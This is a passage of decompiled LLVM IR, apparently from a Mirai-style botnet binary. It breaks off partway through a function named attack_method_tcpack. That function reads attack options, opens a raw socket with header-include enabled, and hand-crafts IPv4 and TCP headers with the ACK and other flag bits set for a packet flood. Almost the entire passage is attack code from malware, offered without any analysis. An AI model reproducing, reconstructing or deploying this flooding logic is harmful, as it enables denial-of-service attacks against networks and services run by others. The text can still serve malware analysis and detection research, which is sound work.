  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45, 47, 46, 48, 50, 49, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 9, 8, 11, 10, 16, 12, 13, 14, 15, 19, 17, 18, 21, 20, 22, 25, 24, 23, 26, 27, 28, 30, 31, 29, 32, 34, 33, 35, 36, 37, 39, 38, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 and (i32 ptrtoint (i32* @global_var_ff00.32 to i32), i32 16776960), { 1, 2, 0, 4, 5, 3 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b9d8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b9ac, { 1, 0 }
  uselistorder label %dec_label_pc_b99c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b98c, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_b6f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b6c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b604, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_b5e4, { 1, 0 }
  uselistorder label %dec_label_pc_b5c0, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_b570, { 1, 0 }
  uselistorder label %dec_label_pc_b554, { 1, 0 }
}

define i32 @attack_method_tcpack(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_bae4 = load i32, i32* @sb, align 4
  %v24_bae4 = load i32, i32* @fp, align 4
  %v27_bae4 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_bb00 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_bb04 = load i32, i32* @r5, align 4
  store i32 %v0_bb04, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bb14 = load i32, i32* @r4, align 4
  store i32 %v0_bb14, i32* %r0.global-to-local, align 4
  %v5_bb18 = inttoptr i32 %v0_bb04 to i32*
  %v6_bb18 = call i32 @attack_get_opt_int(i32 %v0_bb14, i32* %v5_bb18, i32 2, i32 0)
  %v1_bb24 = urem i32 %v6_bb18, 256
  store i32 %v1_bb24, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_bb30 = load i32, i32* @r5, align 4
  store i32 %v0_bb30, i32* %r1.global-to-local, align 4
  %v0_bb34 = load i32, i32* @r4, align 4
  store i32 %v0_bb34, i32* %r0.global-to-local, align 4
  %v6_bb3c = inttoptr i32 %v0_bb30 to i32*
  %v7_bb3c = call i32 @attack_get_opt_int(i32 %v0_bb34, i32* %v6_bb3c, i32 3, i32 65535)
  %v0_bb40 = load i32, i32* @r5, align 4
  store i32 %v0_bb40, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_bb3c, i32* %sb.global-to-local, align 4
  %v0_bb50 = load i32, i32* @r4, align 4
  store i32 %v0_bb50, i32* %r0.global-to-local, align 4
  %v4_bb54 = inttoptr i32 %v0_bb40 to i32*
  %v5_bb54 = call i32 @attack_get_opt_int(i32 %v0_bb50, i32* %v4_bb54, i32 4, i32 64)
  %v1_bb5c = urem i32 %v5_bb54, 256
  store i32 %v1_bb5c, i32* %ip.global-to-local, align 4
  %v0_bb60 = load i32, i32* @r5, align 4
  store i32 %v0_bb60, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bb6c = load i32, i32* @r4, align 4
  store i32 %v0_bb6c, i32* %r0.global-to-local, align 4
  %v6_bb74 = inttoptr i32 %v0_bb60 to i32*
  %v7_bb74 = call i32 @attack_get_opt_int(i32 %v0_bb6c, i32* %v6_bb74, i32 5, i32 0)
  %v1_bb80 = urem i32 %v7_bb74, 256
  store i32 %v1_bb80, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_bb8c = load i32, i32* @r5, align 4
  store i32 %v0_bb8c, i32* %r1.global-to-local, align 4
  %v0_bb90 = load i32, i32* @r4, align 4
  store i32 %v0_bb90, i32* %r0.global-to-local, align 4
  %v5_bb98 = inttoptr i32 %v0_bb8c to i32*
  %v6_bb98 = call i32 @attack_get_opt_int(i32 %v0_bb90, i32* %v5_bb98, i32 6, i32 65535)
  %v0_bba0 = load i32, i32* @r5, align 4
  store i32 %v0_bba0, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_bb98, i32* @r6, align 4
  %v0_bbb0 = load i32, i32* @r4, align 4
  store i32 %v0_bbb0, i32* %r0.global-to-local, align 4
  %v4_bbb4 = inttoptr i32 %v0_bba0 to i32*
  %v5_bbb4 = call i32 @attack_get_opt_int(i32 %v0_bbb0, i32* %v4_bbb4, i32 7, i32 65535)
  %v0_bbbc = load i32, i32* @r5, align 4
  store i32 %v0_bbbc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v5_bbb4, i32* @sl, align 4
  %v0_bbcc = load i32, i32* @r4, align 4
  store i32 %v0_bbcc, i32* %r0.global-to-local, align 4
  %v4_bbd0 = inttoptr i32 %v0_bbbc to i32*
  %v5_bbd0 = call i32 @attack_get_opt_int(i32 %v0_bbcc, i32* %v4_bbd0, i32 17, i32 65535)
  %v0_bbdc = load i32, i32* @r5, align 4
  store i32 %v0_bbdc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  %v0_bbe8 = load i32, i32* @r4, align 4
  store i32 %v0_bbe8, i32* %r0.global-to-local, align 4
  %v5_bbec = inttoptr i32 %v0_bbdc to i32*
  %v6_bbec = call i32 @attack_get_opt_int(i32 %v0_bbe8, i32* %v5_bbec, i32 18, i32 65535)
  %v0_bbf0 = load i32, i32* @r5, align 4
  store i32 %v0_bbf0, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc00 = load i32, i32* @r4, align 4
  store i32 %v0_bc00, i32* %r0.global-to-local, align 4
  %v5_bc04 = inttoptr i32 %v0_bbf0 to i32*
  %v6_bc04 = call i32 @attack_get_opt_int(i32 %v0_bc00, i32* %v5_bc04, i32 11, i32 0)
  %v0_bc08 = load i32, i32* @r5, align 4
  store i32 %v0_bc08, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bc18 = load i32, i32* @r4, align 4
  store i32 %v0_bc18, i32* %r0.global-to-local, align 4
  %v5_bc1c = inttoptr i32 %v0_bc08 to i32*
  %v6_bc1c = call i32 @attack_get_opt_int(i32 %v0_bc18, i32* %v5_bc1c, i32 12, i32 1)
  %v0_bc20 = load i32, i32* @r5, align 4
  store i32 %v0_bc20, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc30 = load i32, i32* @r4, align 4
  store i32 %v0_bc30, i32* %r0.global-to-local, align 4
  %v5_bc34 = inttoptr i32 %v0_bc20 to i32*
  %v6_bc34 = call i32 @attack_get_opt_int(i32 %v0_bc30, i32* %v5_bc34, i32 13, i32 0)
  %v0_bc38 = load i32, i32* @r5, align 4
  store i32 %v0_bc38, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc48 = load i32, i32* @r4, align 4
  store i32 %v0_bc48, i32* %r0.global-to-local, align 4
  %v5_bc4c = inttoptr i32 %v0_bc38 to i32*
  %v6_bc4c = call i32 @attack_get_opt_int(i32 %v0_bc48, i32* %v5_bc4c, i32 14, i32 0)
  %v0_bc50 = load i32, i32* @r5, align 4
  store i32 %v0_bc50, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc60 = load i32, i32* @r4, align 4
  store i32 %v0_bc60, i32* %r0.global-to-local, align 4
  %v5_bc64 = inttoptr i32 %v0_bc50 to i32*
  %v6_bc64 = call i32 @attack_get_opt_int(i32 %v0_bc60, i32* %v5_bc64, i32 15, i32 0)
  %v0_bc68 = load i32, i32* @r5, align 4
  store i32 %v0_bc68, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bc78 = load i32, i32* @r4, align 4
  store i32 %v0_bc78, i32* %r0.global-to-local, align 4
  %v5_bc7c = inttoptr i32 %v0_bc68 to i32*
  %v6_bc7c = call i32 @attack_get_opt_int(i32 %v0_bc78, i32* %v5_bc7c, i32 16, i32 0)
  %v0_bc80 = load i32, i32* @r5, align 4
  store i32 %v0_bc80, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_bc90 = load i32, i32* @r4, align 4
  store i32 %v0_bc90, i32* %r0.global-to-local, align 4
  %v5_bc94 = inttoptr i32 %v0_bc80 to i32*
  %v6_bc94 = call i32 @attack_get_opt_int(i32 %v0_bc90, i32* %v5_bc94, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_bca4 = load i32, i32* @r5, align 4
  store i32 %v0_bca4, i32* %r1.global-to-local, align 4
  %v0_bca8 = load i32, i32* @r4, align 4
  store i32 %v0_bca8, i32* %r0.global-to-local, align 4
  %v4_bcac = inttoptr i32 %v0_bca4 to i32*
  %v5_bcac = call i32 @attack_get_opt_int(i32 %v0_bca8, i32* %v4_bcac, i32 1, i32 1)
  %v2_bcb8 = load i32, i32* @global_var_241f0.57, align 4
  store i32 %v2_bcb8, i32* %r3.global-to-local, align 4
  %v1_bcbc = urem i32 %v5_bcac, 256
  store i32 %v1_bcbc, i32* %ip.global-to-local, align 4
  %v0_bcc0 = load i32, i32* @r5, align 4
  store i32 %v0_bcc0, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_bcc8 = load i32, i32* @r4, align 4
  store i32 %v0_bcc8, i32* %r0.global-to-local, align 4
  %v5_bcd0 = inttoptr i32 %v0_bcc0 to i32*
  %v6_bcd0 = call i32 @attack_get_opt_ip(i32 %v0_bcc8, i32* %v5_bcd0, i32 25, i32 %v2_bcb8, i32 %v1_bcbc)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_bce4 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_bce4, i32* %r0.global-to-local, align 4
  %v7_bce8 = icmp eq i32 %v3_bce4, -1
  store i1 %v7_bce8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bce8, label %dec_label_pc_c1b0, label %dec_label_pc_bcf4

dec_label_pc_bcf4:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_bcfc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_bcfc, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_bd10 = call i32 @__GI_setsockopt(i32 %v3_bce4, i32 0, i32 3, i32 %v6_bcfc, i32 4)
  store i32 %v5_bd10, i32* %r0.global-to-local, align 4
  %v7_bd14 = icmp eq i32 %v5_bd10, -1
  store i1 %v7_bd14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bd14, label %dec_label_pc_c1a8, label %dec_label_pc_bd1c

dec_label_pc_bd1c:                                ; preds = %dec_label_pc_bcf4
  %v0_bd1c = load i32, i32* %sb.global-to-local, align 4
  %v3_bd1c = mul i32 %v0_bd1c, 65536
  store i32 %v3_bd1c, i32* @r5, align 4
  %v0_bd20 = load i32, i32* @r6, align 4
  %v0_bd24 = load i32, i32* @sl, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_bd2c = urem i32 %v0_bd1c, 65536
  store i32 %v3_bd2c, i32* %r1.global-to-local, align 4
  %v3_bd30 = urem i32 %v0_bd20, 65536
  store i32 %v3_bd30, i32* %r2.global-to-local, align 4
  %v3_bd34 = urem i32 %v0_bd24, 65536
  store i32 %v3_bd34, i32* %r3.global-to-local, align 4
  %v0_bd38 = load i32, i32* @r7, align 4
  %v2_bd38 = icmp eq i32 %v0_bd38, 0
  store i1 %v2_bd38, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bd38, label %dec_label_pc_c1bc, label %dec_label_pc_bd50

dec_label_pc_bd50:                                ; preds = %dec_label_pc_bd1c
  %v3_bd54 = mul i32 %v6_bc94, 65536
  %v1_bd58 = add i32 %v3_bd54, 2621440
  store i32 %v1_bd58, i32* @lr, align 4
  %tmp59 = mul i32 %v0_bd20, 256
  %v3_bd7c = and i32 %tmp59, 65280
  %tmp60 = mul i32 %v0_bd24, 256
  %v3_bd80 = and i32 %tmp60, 65280
  %tmp61 = udiv i32 %v0_bd20, 256
  %v4_bd84 = urem i32 %tmp61, 256
  %v5_bd84 = or i32 %v4_bd84, %v3_bd7c
  store i32 %v5_bd84, i32* @r6, align 4
  %tmp62 = udiv i32 %v0_bd24, 256
  %v4_bd88 = urem i32 %tmp62, 256
  %v5_bd88 = or i32 %v4_bd88, %v3_bd80
  store i32 %v5_bd88, i32* @sl, align 4
  %tmp63 = udiv i32 %v1_bd58, 256
  %v3_bd9c = and i32 %tmp63, 65280
  %tmp64 = mul i32 %v0_bd1c, 256
  %v3_bda0 = and i32 %tmp64, 65280
  %tmp65 = mul i32 %v5_bbd0, 256
  %v3_bda4 = and i32 %tmp65, 65280
  %v1_bda8 = urem i32 %v6_bc04, 2
  %v1_bdac = urem i32 %v6_bc1c, 2
  %tmp66 = udiv i32 %v5_bbd0, 256
  %v4_bdb0 = urem i32 %tmp66, 256
  %v5_bdb0 = or i32 %v4_bdb0, %v3_bda4
  %v4_bdb4 = udiv i32 %v1_bd58, 16777216
  %v5_bdb4 = or i32 %v3_bd9c, %v4_bdb4
  store i32 %v5_bdb4, i32* @sb, align 4
  %tmp67 = udiv i32 %v0_bd1c, 256
  %v4_bdb8 = urem i32 %tmp67, 256
  %v5_bdb8 = or i32 %v4_bdb8, %v3_bda0
  store i32 %v5_bdb8, i32* @fp, align 4
  %v1_bdd4 = urem i32 %v6_bc34, 2
  store i32 %v1_bdd4, i32* %r2.global-to-local, align 4
  %v1_bdd8 = urem i32 %v6_bc4c, 2
  store i32 %v1_bdd8, i32* %r3.global-to-local, align 4
  %v1_bddc = urem i32 %v6_bc64, 2
  store i32 %v1_bddc, i32* %ip.global-to-local, align 4
  %v1_bde0 = urem i32 %v6_bc7c, 2
  store i32 %v1_bde0, i32* %r0.global-to-local, align 4
  %v1_bde4 = urem i32 %v6_bc34, 256
  store i32 %v1_bde4, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext = mul i32 %v6_bb18, 16777216
  %v4_be58 = sdiv i32 %sext, 16777216
  %sext3 = mul i32 %v5_bb54, 16777216
  %v4_be64 = sdiv i32 %sext3, 16777216
  %tmp = sub nsw i32 0, %v1_bdac
  %v4_bed0 = and i32 %tmp, 16
  %tmp72 = sub nsw i32 0, %v1_bdd4
  %v4_beec = and i32 %tmp72, 8
  %tmp73 = sub nsw i32 0, %v1_bdd8
  %v4_bf00 = and i32 %tmp73, 4
  %tmp74 = sub nsw i32 0, %v1_bddc
  %v3_bf14 = and i32 %tmp74, 2
  %v2_bf38 = icmp eq i32 %v1_bde4, 0
  %v1_be60 = trunc i32 %v4_be58 to i8
  %extract.t = trunc i32 %v4_be64 to i8
  br label %dec_label_pc_be04

dec_label_pc_be04:                                ; preds = %bb70, %dec_label_pc_bd50
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_be10 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_be10, i32* %r0.global-to-local, align 4
  %v2_be18 = load i32, i32* @r4, align 4
  %v5_be18 = mul i32 %v2_be18, 4
  %v6_be18 = add i32 %v5_be18, %v2_bb00
  %v7_be18 = inttoptr i32 %v6_be18 to i32*
  store i32 %v2_be10, i32* %v7_be18, align 4
  %v3_be1c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_be1c, i32* %r2.global-to-local, align 4
  %v5_be24 = mul i32 %v3_be1c, 24
  %v1_be28 = load i32, i32* @r8, align 4
  %v2_be28 = add i32 %v1_be28, %v5_be24
  store i32 %v2_be28, i32* %r1.global-to-local, align 4
  store i32 %v2_bb00, i32* %r3.global-to-local, align 4
  %v4_be30 = mul i32 %v3_be1c, 4
  %v5_be30 = add i32 %v4_be30, %v2_bb00
  %v6_be30 = inttoptr i32 %v5_be30 to i32*
  %v7_be30 = load i32, i32* %v6_be30, align 4
  store i32 %v7_be30, i32* @r5, align 4
  %v1_be34 = inttoptr i32 %v7_be30 to i8*
  %v2_be34 = load i8, i8* %v1_be34, align 1
  %tmp75 = urem i8 %v2_be34, 16
  %v1_be38 = zext i8 %tmp75 to i32
  %v1_be3c = or i32 %v1_be38, 64
  store i32 %v1_be3c, i32* %r3.global-to-local, align 4
  %v1_be40 = trunc i32 %v1_be3c to i8
  store i8 %v1_be40, i8* %v1_be34, align 1
  %v0_be44 = load i32, i32* @r5, align 4
  %v1_be44 = inttoptr i32 %v0_be44 to i8*
  %v2_be44 = load i8, i8* %v1_be44, align 1
  %v1_be48 = and i8 %v2_be44, -16
  %v1_be4c = or i8 %v1_be48, 5
  store i32 %v1_bb80, i32* %ip.global-to-local, align 4
  store i8 %v1_be4c, i8* %v1_be44, align 1
  store i32 %v4_be58, i32* %r0.global-to-local, align 4
  %v0_be5c = load i32, i32* %ip.global-to-local, align 4
  %v2_be5c = icmp eq i32 %v0_be5c, 0
  store i1 %v2_be5c, i1* %cpsr_z.global-to-local, align 1
  %v2_be60 = load i32, i32* @r5, align 4
  %v3_be60 = add i32 %v2_be60, 1
  %v4_be60 = inttoptr i32 %v3_be60 to i8*
  store i8 %v1_be60, i8* %v4_be60, align 1
  store i32 %v4_be64, i32* %r2.global-to-local, align 4
  %v0_be68 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_be68, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_be04
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_be6c = load i32, i32* @r5, align 4
  %v4_be6c = add i32 %v3_be6c, 6
  %v5_be6c = inttoptr i32 %v4_be6c to i16*
  store i16 64, i16* %v5_be6c, align 2
  %v0_be74.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t17 = trunc i32 %v0_be74.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_be04, %bb
  %v0_be74.off0 = phi i8 [ %extract.t, %dec_label_pc_be04 ], [ %extract.t17, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_be74 = load i32, i32* @r5, align 4
  %v3_be74 = add i32 %v2_be74, 8
  %v4_be74 = inttoptr i32 %v3_be74 to i8*
  store i8 %v0_be74.off0, i8* %v4_be74, align 1
  %v0_be78 = load i32, i32* %r3.global-to-local, align 4
  %v1_be78 = trunc i32 %v0_be78 to i8
  %v2_be78 = load i32, i32* @r5, align 4
  %v3_be78 = add i32 %v2_be78, 9
  %v4_be78 = inttoptr i32 %v3_be78 to i8*
  store i8 %v1_be78, i8* %v4_be78, align 1
  store i32 %v6_bcd0, i32* %ip.global-to-local, align 4
  %v1_be80 = load i32, i32* @r5, align 4
  %v2_be80 = add i32 %v1_be80, 12
  %v3_be80 = inttoptr i32 %v2_be80 to i32*
  store i32 %v6_bcd0, i32* %v3_be80, align 4
  %v0_be84 = load i32, i32* %r1.global-to-local, align 4
  %v1_be84 = add i32 %v0_be84, 16
  %v2_be84 = inttoptr i32 %v1_be84 to i32*
  %v3_be84 = load i32, i32* %v2_be84, align 4
  store i32 %v3_be84, i32* %r3.global-to-local, align 4
  %v0_be88 = load i32, i32* @sb, align 4
  %v1_be88 = trunc i32 %v0_be88 to i16
  %v2_be88 = load i32, i32* @r5, align 4
  %v3_be88 = add i32 %v2_be88, 2
  %v4_be88 = inttoptr i32 %v3_be88 to i16*
  store i16 %v1_be88, i16* %v4_be88, align 2
  %v0_be8c = load i32, i32* @fp, align 4
  %v1_be8c = trunc i32 %v0_be8c to i16
  %v2_be8c = load i32, i32* @r5, align 4
  %v3_be8c = add i32 %v2_be8c, 4
  %v4_be8c = inttoptr i32 %v3_be8c to i16*
  store i16 %v1_be8c, i16* %v4_be8c, align 2
  %v0_be90 = load i32, i32* %r3.global-to-local, align 4
  %v1_be90 = load i32, i32* @r5, align 4
  %v2_be90 = add i32 %v1_be90, 16
  %v3_be90 = inttoptr i32 %v2_be90 to i32*
  store i32 %v0_be90, i32* %v3_be90, align 4
  %v0_be94 = load i32, i32* @r6, align 4
  %v1_be94 = trunc i32 %v0_be94 to i16
  %v2_be94 = load i32, i32* @r5, align 4
  %v3_be94 = add i32 %v2_be94, 20
  %v4_be94 = inttoptr i32 %v3_be94 to i16*
  store i16 %v1_be94, i16* %v4_be94, align 2
  %v0_be98 = load i32, i32* @r5, align 4
  %v1_be98 = add i32 %v0_be98, 20
  store i32 %v1_be98, i32* @r4, align 4
  %v1_be9c = add i32 %v0_be98, 32
  %v2_be9c = inttoptr i32 %v1_be9c to i8*
  %v3_be9c = load i8, i8* %v2_be9c, align 1
  %v4_be9c = zext i8 %v3_be9c to i32
  store i32 %v4_be9c, i32* %r3.global-to-local, align 4
  %v1_bea0 = add i32 %v0_be98, 33
  %v2_bea0 = inttoptr i32 %v1_bea0 to i8*
  %v3_bea0 = load i8, i8* %v2_bea0, align 1
  %v4_bea0 = zext i8 %v3_bea0 to i32
  store i32 %v1_bda8, i32* %r0.global-to-local, align 4
  %tmp76 = urem i8 %v3_be9c, 16
  %v1_bea8 = zext i8 %tmp76 to i32
  %v1_beac = or i32 %v1_bea8, 80
  store i32 %v1_beac, i32* %r3.global-to-local, align 4
  %v1_beb0 = and i32 %v4_bea0, 223
  store i32 %v1_beb0, i32* %r2.global-to-local, align 4
  %v1_beb4 = trunc i32 %v1_beac to i8
  store i8 %v1_beb4, i8* %v2_be9c, align 1
  %v0_beb8 = load i32, i32* %r2.global-to-local, align 4
  %v1_beb8 = load i32, i32* %r0.global-to-local, align 4
  %v4_beb8 = mul i32 %v1_beb8, 32
  %v5_beb8 = or i32 %v4_beb8, %v0_beb8
  store i32 %v5_beb8, i32* %r2.global-to-local, align 4
  store i32 %v5_bdb0, i32* %r1.global-to-local, align 4
  %v1_bec0 = trunc i32 %v5_beb8 to i8
  %v2_bec0 = load i32, i32* @r4, align 4
  %v3_bec0 = add i32 %v2_bec0, 13
  %v4_bec0 = inttoptr i32 %v3_bec0 to i8*
  store i8 %v1_bec0, i8* %v4_bec0, align 1
  %v0_bec4 = load i32, i32* @r4, align 4
  %v1_bec4 = add i32 %v0_bec4, 13
  %v2_bec4 = inttoptr i32 %v1_bec4 to i8*
  %v3_bec4 = load i8, i8* %v2_bec4, align 1
  %v4_bec4 = zext i8 %v3_bec4 to i32
  store i32 %v1_bdac, i32* %r2.global-to-local, align 4
  %v1_becc = and i32 %v4_bec4, 239
  %v5_bed0 = or i32 %v1_becc, %v4_bed0
  store i32 %v5_bed0, i32* %r3.global-to-local, align 4
  %v0_bed4 = load i32, i32* %r1.global-to-local, align 4
  %v2_bed4 = add i32 %v0_bec4, 4
  %v3_bed4 = inttoptr i32 %v2_bed4 to i32*
  store i32 %v0_bed4, i32* %v3_bed4, align 4
  %v0_bed8 = load i32, i32* @sl, align 4
  %v1_bed8 = trunc i32 %v0_bed8 to i16
  %v2_bed8 = load i32, i32* @r4, align 4
  %v3_bed8 = add i32 %v2_bed8, 2
  %v4_bed8 = inttoptr i32 %v3_bed8 to i16*
  store i16 %v1_bed8, i16* %v4_bed8, align 2
  %v0_bedc = load i32, i32* %r3.global-to-local, align 4
  %v1_bedc = trunc i32 %v0_bedc to i8
  %v2_bedc = load i32, i32* @r4, align 4
  %v3_bedc = add i32 %v2_bedc, 13
  %v4_bedc = inttoptr i32 %v3_bedc to i8*
  store i8 %v1_bedc, i8* %v4_bedc, align 1
  %v0_bee0 = load i32, i32* @r4, align 4
  %v1_bee0 = add i32 %v0_bee0, 13
  %v2_bee0 = inttoptr i32 %v1_bee0 to i8*
  %v3_bee0 = load i8, i8* %v2_bee0, align 1
  %v4_bee0 = zext i8 %v3_bee0 to i32
  store i32 %v1_bdd4, i32* %r3.global-to-local, align 4
  %v1_bee8 = and i32 %v4_bee0, 247
  %v5_beec = or i32 %v1_bee8, %v4_beec
  store i32 %v5_beec, i32* %r2.global-to-local, align 4
  %v1_bef0 = trunc i32 %v5_beec to i8
  store i8 %v1_bef0, i8* %v2_bee0, align 1
  %v0_bef4 = load i32, i32* @r4, align 4
  %v1_bef4 = add i32 %v0_bef4, 13
  %v2_bef4 = inttoptr i32 %v1_bef4 to i8*
  %v3_bef4 = load i8, i8* %v2_bef4, align 1
  %v4_bef4 = zext i8 %v3_bef4 to i32
  store i32 %v1_bdd8, i32* %ip.global-to-local, align 4
  %v1_befc = and i32 %v4_bef4, 251
  %v5_bf00 = or i32 %v1_befc, %v4_bf00
  store i32 %v5_bf00, i32* %r3.global-to-local, align 4
  %v1_bf04 = trunc i32 %v5_bf00 to i8
  store i8 %v1_bf04, i8* %v2_bef4, align 1
  %v0_bf08 = load i32, i32* @r4, align 4
  %v1_bf08 = add i32 %v0_bf08, 13
  %v2_bf08 = inttoptr i32 %v1_bf08 to i8*
  %v3_bf08 = load i8, i8* %v2_bf08, align 1
  %v4_bf08 = zext i8 %v3_bf08 to i32
  store i32 %v1_bddc, i32* %r0.global-to-local, align 4
  %v1_bf10 = and i32 %v4_bf08, 253
  %v4_bf14 = or i32 %v1_bf10, %v3_bf14
  store i32 %v4_bf14, i32* %r2.global-to-local, align 4
  %v1_bf18 = trunc i32 %v4_bf14 to i8
  store i8 %v1_bf18, i8* %v2_bf08, align 1
  %v0_bf1c = load i32, i32* @r4, align 4
  %v1_bf1c = add i32 %v0_bf1c, 13
  %v2_bf1c = inttoptr i32 %v1_bf1c to i8*
  %v3_bf1c = load i8, i8* %v2_bf1c, align 1
  %v4_bf1c = zext i8 %v3_bf1c to i32
  store i32 %v1_bde0, i32* %r1.global-to-local, align 4
  %v1_bf24 = and i32 %v4_bf1c, 254
  %v2_bf28 = or i32 %v1_bf24, %v1_bde0
  store i32 %v2_bf28, i32* %r3.global-to-local, align 4
  %v1_bf2c = trunc i32 %v2_bf28 to i8
  store i8 %v1_bf2c, i8* %v2_bf1c, align 1
  %v0_bf30 = call i32 @rand_next()
